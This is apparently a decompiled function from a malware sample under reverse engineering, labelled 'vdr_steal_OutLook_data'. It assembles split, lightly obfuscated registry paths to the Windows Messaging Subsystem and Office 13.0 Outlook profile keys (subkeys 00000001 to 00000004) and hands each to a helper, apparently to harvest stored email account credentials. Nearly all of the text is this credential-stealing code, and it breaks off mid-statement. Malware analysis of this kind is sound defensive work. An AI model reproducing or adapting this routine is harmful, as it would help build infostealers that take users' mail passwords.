// #STR: "ook\\Profiles\\Out", "B88A00104B2A6676\\00000003", "B88A00104B2A6676\\00000002", "B88A00104B2A6676\\00000004", "Software\\Micr", "B88A00104B2A6676\\00000001", "aging Subsystem\\Profiles\\Out", "NT\\CurrentVersion\\Windows Mess", "osoft\\Windows", "look\\9375CFF0413111d3"
void *__stdcall vdr_steal_OutLook_data()
{
  ctx_final = g_ctx_final;
  procHeapHdl = GetProcessHeap_0();
  g_pHeapBuf = (LPSTR)HeapAlloc_0(procHeapHdl, v188, v189);
  str_B88A00104B2A6676_00000001._Myres = 0xF;
  str_B88A00104B2A6676_00000001._Mysize = 0;
  str_B88A00104B2A6676_00000001.u._Buf[0] = 0;
  len = strlen("B88A00104B2A6676\\00000001");
  std::string::assign(&str_B88A00104B2A6676_00000001, "B88A00104B2A6676\\00000001", len);
  v258 = 0;
  str_look_9375CFF0413111d3._Myres = 0xF;
  str_look_9375CFF0413111d3._Mysize = 0;
  str_look_9375CFF0413111d3.u._Buf[0] = 0;
  len = strlen("look\\9375CFF0413111d3");
  std::string::assign(&str_look_9375CFF0413111d3, "look\\9375CFF0413111d3", len);
  LOBYTE(v258) = 1;
  str_Profiles_Out._Myres = 0xF;
  str_Profiles_Out._Mysize = 0;
  str_Profiles_Out.u._Buf[0] = 0;
  len = strlen("aging Subsystem\\Profiles\\Out");
  std::string::assign(&str_Profiles_Out, "aging Subsystem\\Profiles\\Out", len);
  LOBYTE(v258) = 2;
  str_CurrentVersion_WindowsMess._Myres = 0xF;
  str_CurrentVersion_WindowsMess._Mysize = 0;
  str_CurrentVersion_WindowsMess.u._Buf[0] = 0;
  len = strlen("NT\\CurrentVersion\\Windows Mess");
  std::string::assign(&str_CurrentVersion_WindowsMess, "NT\\CurrentVersion\\Windows Mess", len);
  LOBYTE(v258) = 3;
  str_Windows._Myres = 0xF;
  str_Windows._Mysize = 0;
  str_Windows.u._Buf[0] = 0;
  len = strlen("osoft\\Windows ");
  std::string::assign(&str_Windows, "osoft\\Windows ", len);
  LOBYTE(v258) = 4;
  str_Software_Microsoft_Windows = vdr_std_strcpy_wrap("Software\\Micr", &v248, &str_Windows);
  LOBYTE(v258) = 5;
  v7 = vdr_str_operation_2(&str_CurrentVersion_WindowsMess, str_Software_Microsoft_Windows, &a3);
  LOBYTE(v258) = 6;
  v8 = vdr_str_operation_2(&str_Profiles_Out, v7, &v251);
  LOBYTE(v258) = 7;
  v9 = vdr_str_operation_2(&str_look_9375CFF0413111d3, v8, &v249);
  LOBYTE(v258) = 8;
  v10 = vdr_str_operation_2(&str_B88A00104B2A6676_00000001, v9, &v250);
  LOBYTE(v258) = 9;
  if ( v10->_Myres >= 0x10 )
    v10 = (std_string *)v10->u._Ptr;
  sub_405560(v10);
  if ( v250._Myres >= 0x10 )
    operator delete(v250.u._Ptr);
  v250._Myres = 0xF;
  v250._Mysize = 0;
  v250.u._Buf[0] = 0;
  if ( v249._Myres >= 0x10 )
    operator delete(v249.u._Ptr);
  v249._Myres = 0xF;
  v249._Mysize = 0;
  v249.u._Buf[0] = 0;
  if ( v251._Myres >= 0x10 )
    operator delete(v251.u._Ptr);
  v251._Myres = 0xF;
  v251._Mysize = 0;
  v251.u._Buf[0] = 0;
  if ( a3._Myres >= 0x10 )
    operator delete(a3.u._Ptr);
  a3._Myres = 0xF;
  a3._Mysize = 0;
  a3.u._Buf[0] = 0;
  if ( v248._Myres >= 0x10 )
    operator delete(v248.u._Ptr);
  v248._Myres = 0xF;
  v248._Mysize = 0;
  v248.u._Buf[0] = 0;
  if ( str_Windows._Myres >= 0x10 )
    operator delete(str_Windows.u._Ptr);
  str_Windows._Myres = 0xF;
  str_Windows._Mysize = 0;
  str_Windows.u._Buf[0] = 0;
  if ( str_CurrentVersion_WindowsMess._Myres >= 0x10 )
    operator delete(str_CurrentVersion_WindowsMess.u._Ptr);
  str_CurrentVersion_WindowsMess._Myres = 0xF;
  str_CurrentVersion_WindowsMess._Mysize = 0;
  str_CurrentVersion_WindowsMess.u._Buf[0] = 0;
  if ( str_Profiles_Out._Myres >= 0x10 )
    operator delete(str_Profiles_Out.u._Ptr);
  str_Profiles_Out._Myres = 0xF;
  str_Profiles_Out._Mysize = 0;
  str_Profiles_Out.u._Buf[0] = 0;
  if ( str_look_9375CFF0413111d3._Myres >= 0x10 )
    operator delete(str_look_9375CFF0413111d3.u._Ptr);
  v258 = 0xFFFFFFFF;
  str_look_9375CFF0413111d3._Myres = 0xF;
  str_look_9375CFF0413111d3._Mysize = 0;
  str_look_9375CFF0413111d3.u._Buf[0] = 0;
  if ( str_B88A00104B2A6676_00000001._Myres >= 0x10 )
    operator delete(str_B88A00104B2A6676_00000001.u._Ptr);
  str_B88A00104B2A6676_00000001._Myres = 0xF;
  str_B88A00104B2A6676_00000001._Mysize = 0;
  str_B88A00104B2A6676_00000001.u._Buf[0] = 0;
  len = strlen("B88A00104B2A6676\\00000002");
  std::string::assign(&str_B88A00104B2A6676_00000001, "B88A00104B2A6676\\00000002", len);
  v258 = 0xA;
  str_Windows._Myres = 0xF;
  str_Windows._Mysize = 0;
  str_Windows.u._Buf[0] = 0;
  v12 = strlen("look\\9375CFF0413111d3");
  std::string::assign(&str_Windows, "look\\9375CFF0413111d3", v12);
  LOBYTE(v258) = 0xB;
  str_CurrentVersion_WindowsMess._Myres = 0xF;
  str_CurrentVersion_WindowsMess._Mysize = 0;
  str_CurrentVersion_WindowsMess.u._Buf[0] = 0;
  len = strlen("aging Subsystem\\Profiles\\Out");
  std::string::assign(&str_CurrentVersion_WindowsMess, "aging Subsystem\\Profiles\\Out", len);
  LOBYTE(v258) = 0xC;
  str_Profiles_Out._Myres = 0xF;
  str_Profiles_Out._Mysize = 0;
  str_Profiles_Out.u._Buf[0] = 0;
  len = strlen("NT\\CurrentVersion\\Windows Mess");
  std::string::assign(&str_Profiles_Out, "NT\\CurrentVersion\\Windows Mess", len);
  LOBYTE(v258) = 0xD;
  str_look_9375CFF0413111d3._Myres = 0xF;
  str_look_9375CFF0413111d3._Mysize = 0;
  str_look_9375CFF0413111d3.u._Buf[0] = 0;
  len = strlen("osoft\\Windows ");
  std::string::assign(&str_look_9375CFF0413111d3, "osoft\\Windows ", len);
  LOBYTE(v258) = 0xE;
  v16 = vdr_std_strcpy_wrap("Software\\Micr", &v250, &str_look_9375CFF0413111d3);
  LOBYTE(v258) = 0xF;
  v17 = vdr_str_operation_2(&str_Profiles_Out, v16, &v249);
  LOBYTE(v258) = 0x10;
  v18 = vdr_str_operation_2(&str_CurrentVersion_WindowsMess, v17, &v251);
  LOBYTE(v258) = 0x11;
  v19 = vdr_str_operation_2(&str_Windows, v18, &a3);
  LOBYTE(v258) = 0x12;
  v20 = vdr_str_operation_2(&str_B88A00104B2A6676_00000001, v19, &v248);
  LOBYTE(v258) = 0x13;
  if ( v20->_Myres >= 0x10 )
    v20 = (std_string *)v20->u._Ptr;
  sub_405560(v20);
  if ( v248._Myres >= 0x10 )
    operator delete(v248.u._Ptr);
  v248._Myres = 0xF;
  v248._Mysize = 0;
  v248.u._Buf[0] = 0;
  if ( a3._Myres >= 0x10 )
    operator delete(a3.u._Ptr);
  a3._Myres = 0xF;
  a3._Mysize = 0;
  a3.u._Buf[0] = 0;
  if ( v251._Myres >= 0x10 )
    operator delete(v251.u._Ptr);
  v251._Myres = 0xF;
  v251._Mysize = 0;
  v251.u._Buf[0] = 0;
  if ( v249._Myres >= 0x10 )
    operator delete(v249.u._Ptr);
  v249._Myres = 0xF;
  v249._Mysize = 0;
  v249.u._Buf[0] = 0;
  if ( v250._Myres >= 0x10 )
    operator delete(v250.u._Ptr);
  v250._Myres = 0xF;
  v250._Mysize = 0;
  v250.u._Buf[0] = 0;
  if ( str_look_9375CFF0413111d3._Myres >= 0x10 )
    operator delete(str_look_9375CFF0413111d3.u._Ptr);
  str_look_9375CFF0413111d3._Myres = 0xF;
  str_look_9375CFF0413111d3._Mysize = 0;
  str_look_9375CFF0413111d3.u._Buf[0] = 0;
  if ( str_Profiles_Out._Myres >= 0x10 )
    operator delete(str_Profiles_Out.u._Ptr);
  str_Profiles_Out._Myres = 0xF;
  str_Profiles_Out._Mysize = 0;
  str_Profiles_Out.u._Buf[0] = 0;
  if ( str_CurrentVersion_WindowsMess._Myres >= 0x10 )
    operator delete(str_CurrentVersion_WindowsMess.u._Ptr);
  str_CurrentVersion_WindowsMess._Myres = 0xF;
  str_CurrentVersion_WindowsMess._Mysize = 0;
  str_CurrentVersion_WindowsMess.u._Buf[0] = 0;
  if ( str_Windows._Myres >= 0x10 )
    operator delete(str_Windows.u._Ptr);
  v258 = 0xFFFFFFFF;
  str_Windows._Myres = 0xF;
  str_Windows._Mysize = 0;
  str_Windows.u._Buf[0] = 0;
  if ( str_B88A00104B2A6676_00000001._Myres >= 0x10 )
    operator delete(str_B88A00104B2A6676_00000001.u._Ptr);
  str_B88A00104B2A6676_00000001._Myres = 0xF;
  str_B88A00104B2A6676_00000001._Mysize = 0;
  str_B88A00104B2A6676_00000001.u._Buf[0] = 0;
  len = strlen("B88A00104B2A6676\\00000003");
  std::string::assign(&str_B88A00104B2A6676_00000001, "B88A00104B2A6676\\00000003", len);
  v258 = 0x14;
  str_Windows._Myres = 0xF;
  str_Windows._Mysize = 0;
  str_Windows.u._Buf[0] = 0;
  len = strlen("look\\9375CFF0413111d3");
  std::string::assign(&str_Windows, "look\\9375CFF0413111d3", len);
  LOBYTE(v258) = 0x15;
  str_CurrentVersion_WindowsMess._Myres = 0xF;
  str_CurrentVersion_WindowsMess._Mysize = 0;
  str_CurrentVersion_WindowsMess.u._Buf[0] = 0;
  v23 = strlen("aging Subsystem\\Profiles\\Out");
  std::string::assign(&str_CurrentVersion_WindowsMess, "aging Subsystem\\Profiles\\Out", v23);
  LOBYTE(v258) = 0x16;
  str_Profiles_Out._Myres = 0xF;
  str_Profiles_Out._Mysize = 0;
  str_Profiles_Out.u._Buf[0] = 0;
  v24 = strlen("NT\\CurrentVersion\\Windows Mess");
  std::string::assign(&str_Profiles_Out, "NT\\CurrentVersion\\Windows Mess", v24);
  LOBYTE(v258) = 0x17;
  str_look_9375CFF0413111d3._Myres = 0xF;
  str_look_9375CFF0413111d3._Mysize = 0;
  str_look_9375CFF0413111d3.u._Buf[0] = 0;
  v25 = strlen("osoft\\Windows ");
  std::string::assign(&str_look_9375CFF0413111d3, "osoft\\Windows ", v25);
  LOBYTE(v258) = 0x18;
  v26 = vdr_std_strcpy_wrap("Software\\Micr", &v250, &str_look_9375CFF0413111d3);
  LOBYTE(v258) = 0x19;
  v27 = vdr_str_operation_2(&str_Profiles_Out, v26, &v249);
  LOBYTE(v258) = 0x1A;
  v28 = vdr_str_operation_2(&str_CurrentVersion_WindowsMess, v27, &v251);
  LOBYTE(v258) = 0x1B;
  v29 = vdr_str_operation_2(&str_Windows, v28, &a3);
  LOBYTE(v258) = 0x1C;
  v30 = vdr_str_operation_2(&str_B88A00104B2A6676_00000001, v29, &v248);
  LOBYTE(v258) = 0x1D;
  if ( v30->_Myres >= 0x10 )
    v30 = (std_string *)v30->u._Ptr;
  sub_405560(v30);
  if ( v248._Myres >= 0x10 )
    operator delete(v248.u._Ptr);
  v248._Myres = 0xF;
  v248._Mysize = 0;
  v248.u._Buf[0] = 0;
  if ( a3._Myres >= 0x10 )
    operator delete(a3.u._Ptr);
  a3._Myres = 0xF;
  a3._Mysize = 0;
  a3.u._Buf[0] = 0;
  if ( v251._Myres >= 0x10 )
    operator delete(v251.u._Ptr);
  v251._Myres = 0xF;
  v251._Mysize = 0;
  v251.u._Buf[0] = 0;
  if ( v249._Myres >= 0x10 )
    operator delete(v249.u._Ptr);
  v249._Myres = 0xF;
  v249._Mysize = 0;
  v249.u._Buf[0] = 0;
  if ( v250._Myres >= 0x10 )
    operator delete(v250.u._Ptr);
  v250._Myres = 0xF;
  v250._Mysize = 0;
  v250.u._Buf[0] = 0;
  if ( str_look_9375CFF0413111d3._Myres >= 0x10 )
    operator delete(str_look_9375CFF0413111d3.u._Ptr);
  str_look_9375CFF0413111d3._Myres = 0xF;
  str_look_9375CFF0413111d3._Mysize = 0;
  str_look_9375CFF0413111d3.u._Buf[0] = 0;
  if ( str_Profiles_Out._Myres >= 0x10 )
    operator delete(str_Profiles_Out.u._Ptr);
  str_Profiles_Out._Myres = 0xF;
  str_Profiles_Out._Mysize = 0;
  str_Profiles_Out.u._Buf[0] = 0;
  if ( str_CurrentVersion_WindowsMess._Myres >= 0x10 )
    operator delete(str_CurrentVersion_WindowsMess.u._Ptr);
  str_CurrentVersion_WindowsMess._Myres = 0xF;
  str_CurrentVersion_WindowsMess._Mysize = 0;
  str_CurrentVersion_WindowsMess.u._Buf[0] = 0;
  if ( str_Windows._Myres >= 0x10 )
    operator delete(str_Windows.u._Ptr);
  v258 = 0xFFFFFFFF;
  str_Windows._Myres = 0xF;
  str_Windows._Mysize = 0;
  str_Windows.u._Buf[0] = 0;
  if ( str_B88A00104B2A6676_00000001._Myres >= 0x10 )
    operator delete(str_B88A00104B2A6676_00000001.u._Ptr);
  str_B88A00104B2A6676_00000001._Myres = 0xF;
  str_B88A00104B2A6676_00000001._Mysize = 0;
  str_B88A00104B2A6676_00000001.u._Buf[0] = 0;
  v31 = strlen("B88A00104B2A6676\\00000004");
  std::string::assign(&str_B88A00104B2A6676_00000001, "B88A00104B2A6676\\00000004", v31);
  v258 = 0x1E;
  str_Windows._Myres = 0xF;
  str_Windows._Mysize = 0;
  str_Windows.u._Buf[0] = 0;
  v32 = strlen("look\\9375CFF0413111d3");
  std::string::assign(&str_Windows, "look\\9375CFF0413111d3", v32);
  LOBYTE(v258) = 0x1F;
  str_CurrentVersion_WindowsMess._Myres = 0xF;
  str_CurrentVersion_WindowsMess._Mysize = 0;
  str_CurrentVersion_WindowsMess.u._Buf[0] = 0;
  v33 = strlen("aging Subsystem\\Profiles\\Out");
  std::string::assign(&str_CurrentVersion_WindowsMess, "aging Subsystem\\Profiles\\Out", v33);
  LOBYTE(v258) = 0x20;
  str_Profiles_Out._Myres = 0xF;
  str_Profiles_Out._Mysize = 0;
  str_Profiles_Out.u._Buf[0] = 0;
  v34 = strlen("NT\\CurrentVersion\\Windows Mess");
  std::string::assign(&str_Profiles_Out, "NT\\CurrentVersion\\Windows Mess", v34);
  LOBYTE(v258) = 0x21;
  str_look_9375CFF0413111d3._Myres = 0xF;
  str_look_9375CFF0413111d3._Mysize = 0;
  str_look_9375CFF0413111d3.u._Buf[0] = 0;
  v35 = strlen("osoft\\Windows ");
  std::string::assign(&str_look_9375CFF0413111d3, "osoft\\Windows ", v35);
  LOBYTE(v258) = 0x22;
  v36 = vdr_std_strcpy_wrap("Software\\Micr", &v250, &str_look_9375CFF0413111d3);
  LOBYTE(v258) = 0x23;
  v37 = vdr_str_operation_2(&str_Profiles_Out, v36, &v249);
  LOBYTE(v258) = 0x24;
  v38 = vdr_str_operation_2(&str_CurrentVersion_WindowsMess, v37, &v251);
  LOBYTE(v258) = 0x25;
  v39 = vdr_str_operation_2(&str_Windows, v38, &a3);
  LOBYTE(v258) = 0x26;
  v40 = vdr_str_operation_2(&str_B88A00104B2A6676_00000001, v39, &v248);
  LOBYTE(v258) = 0x27;
  if ( v40->_Myres >= 0x10 )
    v40 = (std_string *)v40->u._Ptr;
  sub_405560(v40);
  if ( v248._Myres >= 0x10 )
    operator delete(v248.u._Ptr);
  v248._Myres = 0xF;
  v248._Mysize = 0;
  v248.u._Buf[0] = 0;
  if ( a3._Myres >= 0x10 )
    operator delete(a3.u._Ptr);
  a3._Myres = 0xF;
  a3._Mysize = 0;
  a3.u._Buf[0] = 0;
  if ( v251._Myres >= 0x10 )
    operator delete(v251.u._Ptr);
  v251._Myres = 0xF;
  v251._Mysize = 0;
  v251.u._Buf[0] = 0;
  if ( v249._Myres >= 0x10 )
    operator delete(v249.u._Ptr);
  v249._Myres = 0xF;
  v249._Mysize = 0;
  v249.u._Buf[0] = 0;
  if ( v250._Myres >= 0x10 )
    operator delete(v250.u._Ptr);
  v250._Myres = 0xF;
  v250._Mysize = 0;
  v250.u._Buf[0] = 0;
  if ( str_look_9375CFF0413111d3._Myres >= 0x10 )
    operator delete(str_look_9375CFF0413111d3.u._Ptr);
  str_look_9375CFF0413111d3._Myres = 0xF;
  str_look_9375CFF0413111d3._Mysize = 0;
  str_look_9375CFF0413111d3.u._Buf[0] = 0;
  if ( str_Profiles_Out._Myres >= 0x10 )
    operator delete(str_Profiles_Out.u._Ptr);
  str_Profiles_Out._Myres = 0xF;
  str_Profiles_Out._Mysize = 0;
  str_Profiles_Out.u._Buf[0] = 0;
  if ( str_CurrentVersion_WindowsMess._Myres >= 0x10 )
    operator delete(str_CurrentVersion_WindowsMess.u._Ptr);
  str_CurrentVersion_WindowsMess._Myres = 0xF;
  str_CurrentVersion_WindowsMess._Mysize = 0;
  str_CurrentVersion_WindowsMess.u._Buf[0] = 0;
  if ( str_Windows._Myres >= 0x10 )
    operator delete(str_Windows.u._Ptr);
  v258 = 0xFFFFFFFF;
  str_Windows._Myres = 0xF;
  str_Windows._Mysize = 0;
  str_Windows.u._Buf[0] = 0;
  if ( str_B88A00104B2A6676_00000001._Myres >= 0x10 )
    operator delete(str_B88A00104B2A6676_00000001.u._Ptr);
  str_B88A00104B2A6676_00000001._Myres = 0xF;
  str_B88A00104B2A6676_00000001._Mysize = 0;
  str_B88A00104B2A6676_00000001.u._Buf[0] = 0;
  v41 = strlen("B88A00104B2A6676\\00000001");
  std::string::assign(&str_B88A00104B2A6676_00000001, "B88A00104B2A6676\\00000001", v41);
  v258 = 0x28;
  str_Windows._Myres = 0xF;
  str_Windows._Mysize = 0;
  str_Windows.u._Buf[0] = 0;
  v42 = strlen("look\\9375CFF0413111d3");
  std::string::assign(&str_Windows, "look\\9375CFF0413111d3", v42);
  LOBYTE(v258) = 0x29;
  str_CurrentVersion_WindowsMess._Myres = 0xF;
  str_CurrentVersion_WindowsMess._Mysize = 0;
  str_CurrentVersion_WindowsMess.u._Buf[0] = 0;
  v43 = strlen("ook\\Profiles\\Out");
  std::string::assign(&str_CurrentVersion_WindowsMess, "ook\\Profiles\\Out", v43);
  LOBYTE(v258) = 0x2A;
  str_Profiles_Out._Myres = 0xF;
  str_Profiles_Out._Mysize = 0;
  str_Profiles_Out.u._Buf[0] = 0;
  v44 = strlen("ce\\13.0\\Outl");
  std::string::assign(&str_Profiles_Out, "ce\\13.0\\Outl", v44);
  LOBYTE(v258) = 0x2B;
  str_look_9375CFF0413111d3._Myres = 0xF;
  str_look_9375CFF0413111d3._Mysize = 0;
  str_look_9375CFF0413111d3.u._Buf[0] = 0;
  v45 = strlen("osoft\\Offi");
  std::string::assign(&str_look_9375CFF0413111d3, "osoft\\Offi", v45);
  LOBYTE(v258) = 0x2C;
  v46 = vdr_std_strcpy_wrap("Software\\Micr", &v250, &str_look_9375CFF0413111d3);
  LOBYTE(v258) = 0x2D;
  v47 = vdr_str_operation_2(&str_Profiles_Out, v46, &v249);
  LOBYTE(v258) = 0x2E;
  v48 = vdr_str_operation_2(&str_CurrentVersion_WindowsMess, v47, &v251);
  LOBYTE(v258) = 0x2F;
  v49 = vdr_str_operation_2(&str_Windows, v48, &a3);
  LOBYTE(v258) = 0x30;
  v50 = vdr_str_operation_2(&str_B88A00104B2A6676_00000001, v49, &v248);
  LOBYTE(v258) = 0x31;
  if ( v50->_Myres >= 0x10 )
    v50 = (std_string *)v50->u._Ptr;
  sub_405560(v50);
  if ( v248._Myres >= 0x10 )
    operator delete(v248.u._Ptr);
  v248._Myres = 0xF;
  v248._Mysize = 0;
  v248.u._Buf[0] = 0;
  if ( a3._Myres >= 0x10 )
    operator delete(a3.u._Ptr);
  a3._Myres = 0xF;
  a3._Mysize = 0;
  a3.u._Buf[0] = 0;
  if ( v251._Myres >= 0x10 )
    operator delete(v251.u._Ptr);
  v251._Myres = 0xF;
  v251._Mysize = 0;
  v251.u._Buf[0] = 0;
  if ( v249._Myres >= 0x10 )
    operator delete(v249.u._Ptr);
  v249._Myres = 0xF;
  v249._Mysize = 0;
  v249.u._Buf[0] = 0;
  if ( v250._Myres >= 0x10 )
    operator delete(v250.u._Ptr);
  v250._Myres = 0xF;
  v250._Mysize = 0;
  v250.u._Buf[0] = 0;
  if ( str_look_9375CFF0413111d3._Myres >= 0x10 )
    operator delete(str_look_9375CFF0413111d3.u._Ptr);
  str_look_9375CFF0413111d3._Myres = 0xF;
  str_look_9375CFF0413111d3._Mysize = 0;
  str_look_9375CFF0413111d3.u._Buf[0] = 0;
  if ( str_Profiles_Out._Myres >= 0x10 )
    operator delete(str_Profiles_Out.u._Ptr);
  str_Profiles_Out._Myres = 0xF;
  str_Profiles_Out._Mysize = 0;
  str_Profiles_Out.u._Buf[0] = 0;
  if ( str_CurrentVersion_WindowsMess._Myres >= 0x10 )
    operator delete(str_CurrentVersion_WindowsMess.u._Ptr);
  str_CurrentVersion_WindowsMess._Myres = 0xF;
  str_CurrentVersion_WindowsMess._Mysize = 0;
  str_CurrentVersion_WindowsMess.u._Buf[0] = 0;
  if ( str_Windows._Myres >= 0x10 )
    operator delete(str_Windows.u._Ptr);
  v258 = 0xFFFFFFFF;
  str_Windows._Myres = 0xF;
  str_Windows._Mysize = 0;
  str_Windows.u._Buf[0] = 0;
  if ( str_B88A00104B2A6676_00000001._Myres >= 0x10 )
    operator delete(str_B88A00104B2A6676_00000001.u._Ptr);
  str_B88A00104B2A6676_00000001._Myres = 0xF;
  str_B88A00104B2A6676_00000001._Mysize = 0;
  str_B88A00104B2A6676_00000001.u._Buf[0] = 0;
  v51 = strlen("B88A00104B2A6676\\00000002");
  std::string::assign(&str_B88A00104B2A6676_00000001, "B88A00104B2A6676\\00000002", v51);
  v258 = 0x32;
  str_Windows._Myres = 0xF;
  str_Windows._Mysize = 0;
  str_Windows.u._Buf[0] = 0;
  v52 = strlen("look\\9375CFF0413111d3");
  std::string::assign(&str_Windows, "look\\9375CFF0413111d3", v52);
  LOBYTE(v258) = 0x33;
  str_CurrentVersion_WindowsMess._Myres = 0xF;
  str_CurrentVersion_WindowsMess._Mysize = 0;
  str_CurrentVersion_WindowsMess.u._Buf[0] = 0;
  v53 = strlen("ook\\Profiles\\Out");
  std::string::assign(&str_CurrentVersion_WindowsMess, "ook\\Profiles\\Out", v53);
  LOBYTE(v258) = 0x34;
  str_Profiles_Out._Myres = 0xF;
  str_Profiles_Out._Mysize = 0;
  str_Profiles_Out.u._Buf[0] = 0;
  v54 = strlen("ce\\13.0\\Outl");
  std::string::assign(&str_Profiles_Out, "ce\\13.0\\Outl", v54);
  LOBYTE(v258) = 0x35;
  str_look_9375CFF0413111d3._Myres = 0xF;
  str_look_9375CFF0413111d3._Mysize = 0;
  str_look_9375CFF0413111d3.u._Buf[0] = 0;
  v55 = strlen("osoft\\Offi");
  std::string::assign(&str_look_9375CFF0413111d3, "osoft\\Offi", v55);
  LOBYTE(v258) = 0x36;
  v56 = vdr_std_strcpy_wrap("Software\\Micr", &v250, &str_look_9375CFF0413111d3);
  LOBYTE(v258) = 0x37;
  v57 = vdr_str_operation_2(&str_Profiles_Out, v56, &v249);
  LOBYTE(v258) = 0x38;
  v58 = vdr_str_operation_2(&str_CurrentVersion_WindowsMess, v57, &v251);
  LOBYTE(v258) = 0x39;
  v59 = vdr_str_operation_2(&str_Windows, v58, &a3);
  LOBYTE(v258) = 0x3A;
  v60 = vdr_str_operation_2(&str_B88A00104B2A6676_00000001, v59, &v248);
  LOBYTE(v258) = 0x3B;
  if ( v60->_Myres >= 0x10 )
    v60 = (std_string *)v60->u._Ptr;
  sub_405560(v60);
  if ( v248._Myres >= 0x10 )
    operator delete(v248.u._Ptr);
  v248._Myres = 0xF;
  v248._Mysize = 0;
  v248.u._Buf[0] = 0;
  if ( a3._Myres >= 0x10 )
    operator delete(a3.u._Ptr);
  a3._Myres = 0xF;
  a3._Mysize = 0;
  a3.u._Buf[0] = 0;
  if ( v251._Myres >= 0x10 )
    operator delete(v251.u._Ptr);
  v251._Myres = 0xF;
  v251._Mysize = 0;
  v251.u._Buf[0] = 0;
  if ( v249._Myres >= 0x10 )
    operator delete(v249.u._Ptr);
  v249._Myres = 0xF;
  v249._Mysize = 0;
  v249.u._Buf[0] = 0;
  if ( v250._Myres >= 0x10 )
    operator delete(v250.u._Ptr);
  v250._Myres = 0xF;
  v250._Mysize = 0;
  v250.u._Buf[0] = 0;
  if ( str_look_9375CFF0413111d3._Myres >= 0x10 )
    operator delete(str_look_9375CFF0413111d3.u._Ptr);
  str_look_9375CFF0413111d3._Myres = 0xF;
  str_look_9375CFF0413111d3._Mysize = 0;
  str_look_9375CFF0413111d3.u._Buf[0] = 0;
  if ( str_Profiles_Out._Myres >= 0x10 )
    operator delete(str_Profiles_Out.u._Ptr);
  str_Profiles_Out._Myres = 0xF;
  str_Profiles_Out._Mysize = 0;
  str_Profiles_Out.u._Buf[0] = 0;
  if ( str_CurrentVersion_WindowsMess._Myres >= 0x10 )
    operator delete(str_CurrentVersion_WindowsMess.u._Ptr);
  str_CurrentVersion_WindowsMess._Myres = 0xF;
  str_CurrentVersion_WindowsMess._Mysize = 0;
  str_CurrentVersion_WindowsMess.u._Buf[0] = 0;
  if ( str_Windows._Myres >= 0x10 )
    operator delete(str_Windows.u._Ptr);
  v258 = 0xFFFFFFFF;
  str_Windows._Myres = 0xF;
  str_Windows._Mysize = 0;
  str_Windows.u._Buf[0] = 0;
  if ( str_B88A00104B2A6676_00000001._Myres >= 0x10 )
    operator delete(str_B88A00104B2A6676_00000001.u._Ptr);
  str_B88A00104B2A6676_00000001._Myres = 0xF;
  str_B88A00104B2A6676_00000001._Mysize = 0;
  str_B88A00104B2A6676_00000001.u._Buf[0] = 0;
  v61 = strlen("B88A00104B2A6676\\00000003");
  std::string::assign(&str_B88A00104B2A6676_00000001, "B88A00104B2A6676\\00000003", v61);
  v258 = 0x3C;
  str_Windows._Myres = 0xF;
  str_Windows._Mysize = 0;
  str_Windows.u._Buf[0] = 0;
  v62 = strlen("look\\9375CFF0413111d3");
  std::string::assign(&str_Windows, "look\\9375CFF0413111d3", v62);
  LOBYTE(v258) = 0x3D;
  str_CurrentVersion_WindowsMess._Myres = 0xF;
  str_CurrentVersion_WindowsMess._Mysize = 0;
  str_CurrentVersion_WindowsMess.u._Buf[0] = 0;
  v63 = strlen("ook\\Profiles\\Out");
  std::string::assign(&str_CurrentVersion_WindowsMess, "ook\\Profiles\\Out", v63);
  LOBYTE(v258) = 0x3E;
  str_Profiles_Out._Myres = 0xF;
  str_Profiles_Out._Mysize = 0;
  str_Profiles_Out.u._Buf[0] = 0;
  v64 = strlen("ce\\13.0\\Outl");
  std::string::assign(&str_Profiles_Out, "ce\\13.0\\Outl", v64);
  LOBYTE(v258) = 0x3F;
  str_look_9375CFF0413111d3._Myres = 0xF;
  str_look_9375CFF0413111d3._Mysize = 0;
  str_look_9375CFF0413111d3.u._Buf[0] = 0;
  v65 = strlen("osoft\\Offi");
  std::string::assign(&str_look_9375CFF0413111d3, "osoft\\Offi", v65);
  LOBYTE(v258) = 0x40;
  v66 = vdr_std_strcpy_wrap("Software\\Micr", &v250, &str_look_9375CFF0413111d3);
  LOBYTE(v258) = 0x41;
  v67 = vdr_str_operation_2(&str_Profiles_Out, v66, &v249);
  LOBYTE(v258) = 0x42;
  v68 = vdr_str_operation_2(&str_CurrentVersion_WindowsMess, v67, &v251);
  LOBYTE(v258) = 0x43;
  v69 = vdr_str_operation_2(&str_Windows, v68, &a3);
  LOBYTE(v258) = 0x44;
  v70 = vdr_str_operation_2(&str_B88A00104B2A6676_00000001, v69, &v248);
  LOBYTE(v258) = 0x45;
  if ( v70->_Myres >= 0x10 )
    v70 = (std_string *)v70->u._Ptr;
  sub_405560(v70);
  if ( v248._Myres >= 0x10 )
    operator delete(v248.u._Ptr);
  v248._Myres = 0xF;
  v248._Mysize = 0;
  v248.u._Buf[0] = 0;
  if ( a3._Myres >= 0x10 )
    operator delete(a3.u._Ptr);
  a3._Myres = 0xF;
  a3._Mysize = 0;
  a3.u._Buf[0] = 0;
  if ( v251._Myres >= 0x10 )
    operator delete(v251.u._Ptr);
  v251._Myres = 0xF;
  v251._Mysize = 0;
  v251.u._Buf[0] = 0;
  if ( v249._Myres >= 0x10 )
    operator delete(v249.u._Ptr);
  v249._Myres = 0xF;
  v249._Mysize = 0;
  v249.u._Buf[0] = 0;
  if ( v250._Myres >= 0x10 )
    operator delete(v250.u._Ptr);
  v250._Myres = 0xF;
  v250._Mysize = 0;
  v250.u._Buf[0] = 0;
  if ( str_look_9375CFF0413111d3._Myres >= 0x10 )
    operator delete(str_look_9375CFF0413111d3.u._Ptr);
  str_look_9375CFF0413111d3._Myres = 0xF;
  str_look_9375CFF0413111d3._Mysize = 0;
  str_look_9375CFF0413111d3.u._Buf[0] = 0;
  if ( str_Profiles_Out._Myres >= 0x10 )
    operator delete(str_Profiles_Out.u._Ptr);
  str_Profiles_Out._Myres = 0xF;
  str_Profiles_Out._Mysize = 0;
  str_Profiles_Out.u._Buf[0] = 0;
  if ( str_CurrentVersion_WindowsMess._Myres >= 0x10 )
    operator delete(str_CurrentVersion_WindowsMess.u._Ptr);
  str_CurrentVersion_WindowsMess._Myres = 0xF;
  str_CurrentVersion_WindowsMess._Mysize = 0;
  str_CurrentVersion_WindowsMess.u._Buf[0] = 0;
  if ( str_Windows._Myres >= 0x10 )
    operator delete(str_Windows.u._Ptr);
  v258 = 0xFFFFFFFF;
  str_Windows._Myres = 0xF;
  str_Windows._Mysize = 0;
  str_Windows.u._Buf[0] = 0;
  if ( str_B88A00104B2A6676_00000001._Myres >= 0x10 )
